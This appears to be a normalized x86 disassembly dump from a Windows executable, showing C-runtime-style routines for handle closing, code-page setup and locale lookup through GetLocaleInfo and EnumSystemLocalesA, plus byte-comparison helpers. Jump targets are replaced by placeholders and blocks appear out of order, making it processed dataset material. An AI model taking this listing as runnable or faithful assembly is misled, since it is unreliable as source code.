cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_442503
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43c852
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_426919
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_43c852
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_43c852
push 0x1
mov edi eax
call sub_43c852
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_43c7cc
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_44259f
push 0x10
push r--data
call sub_4278c0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_426906
and [ eax ] 0x0
call sub_4268f3
mov [ eax ] 0x9
call sub_42970c
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_427905
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_43c8bb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_442503
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44265b
mov eax [ ebp - 0x1c ]
sub_442670
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4426a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_42acad
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_42acf2
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_42acf2
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_42acf2
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_42acf2
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_42ae11
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_42578a
push [ ebp - 0x1c ]
call sub_42578a
push [ ebp - 0x20 ]
call sub_42578a
push [ ebp - 0x28 ]
call sub_42578a
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_42578a
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_437bec
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_437abf
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_437abf
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_4247f0
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_4247f0
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_4247f0
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_42578a
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_42578a
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_42578a
push [ esi + 0xc0 ]
call sub_42578a
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_442b05
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_42970c
mov eax esi
jmp r-xdata
sub_442b80
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_442bc6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_442c3c
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_427fd0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_437d67
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_442cc0
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_442ce5
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_442d16
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_442d31
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_426c39
mov edx edi
mov esi eax
call sub_442ce5
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_442cc0
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_442dd8
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_442d16
push esi
mov edi eax
call sub_427be0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_442e33
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_426c39
mov edx edi
lea esi [ eax + 0x9c ]
call sub_442ce5
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4461dd
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_446306
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_427be0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_442cc0
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_427be0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_442dd8
pop ecx
pop ecx
test eax eax
je r-xdata
sub_443004
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_426c39
mov edx edi
lea esi [ eax + 0x9c ]
call sub_442ce5
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4461dd
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_442dd8
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_4430c4
push [ esi + 0x4 ]
call sub_427be0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_442d31
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
retn
and [ esi + 0x8 ] 0x0
sub_4430f0
push [ esi ]
call sub_427be0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_427be0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_442d16
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_442e33
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_443157
push [ esi ]
call sub_427be0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_442d16
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_443004
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_443193
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_426c39
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_442bc6
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_442c3c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_427be0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_442d31
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_443157
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_442bc6
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_4430f0
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_443157
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_4430f0
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_427b7a
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_446413
add esp 0x10
sub_4433aa
mov ax [ esi ]
cmp ax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx ecx [ ecx + 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_4433e6
mov eax [ esi ]
cmp eax [ ecx ]
je r-xdata
xor eax eax
movzx edx [ ecx ]
movzx eax al
sub eax edx
je r-xdata
movzx eax [ esi + 0x1 ]
movzx edx [ ecx + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ esi + 0x2 ]
movzx edx [ ecx + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
retn
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
retn
sub_443456
mov edi edi
push esi
push edi
mov edi eax
jmp r-xdata
cmp edi 0x20
jae r-xdata
mov eax [ ecx ]
cmp eax [ edx ]
je r-xdata
add ecx edi
add edx edi
cmp edi 0x1f
ja r-xdata
xor eax eax
movzx esi al
movzx eax [ edx ]
sub esi eax
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_44481e ]
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ecx - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ecx - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ ecx - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ ecx - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ ecx - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ ecx - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ ecx - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ecx - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ ecx - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ ecx - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ ecx - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ ecx - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ ecx - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ ecx - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ ecx - 0x1 ]
movzx ecx [ edx - 0x1 ]
sub eax ecx
je r-xdata
mov eax [ ecx - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ ecx - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ ecx - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ ecx - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ ecx - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ ecx - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ ecx - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ ecx - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ ecx - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ ecx - 0x1b ]
